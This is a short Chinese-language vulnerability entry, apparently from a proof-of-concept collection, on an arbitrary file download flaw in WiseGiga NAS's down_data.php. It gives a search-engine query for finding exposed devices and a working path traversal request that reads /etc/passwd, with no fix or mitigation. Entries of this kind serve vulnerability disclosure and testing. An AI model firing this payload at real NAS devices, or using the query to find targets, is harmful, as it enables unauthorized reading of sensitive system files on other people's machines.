# WiseGiga NAS down_data.php 任意文件下载漏洞

## 漏洞描述

WISEGIGA NAS down_data.php 存在任意文件下载漏洞，由于 /down_data.php 页面 filename 参数过滤不严，导致可以读取系统敏感文件。

## 漏洞影响

<a-checkbox checked>WiseGiga NAS</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="WISEGIGA-NAS"</a-checkbox></br>

## 漏洞复现

主页面

![img](../../../.vuepress/public/img/1656240215340-595e0191-aa82-407e-972d-a59339dfd28a-20220626184843953.png)

验证POC

```php
/down_data.php?filename=../../../../../../../../../../../../../../etc/passwd
```

![img](../../../.vuepress/public/img/1656240238984-898fa7ef-186c-4376-8a6f-61ab19fa2d0d-20220626184848871.png)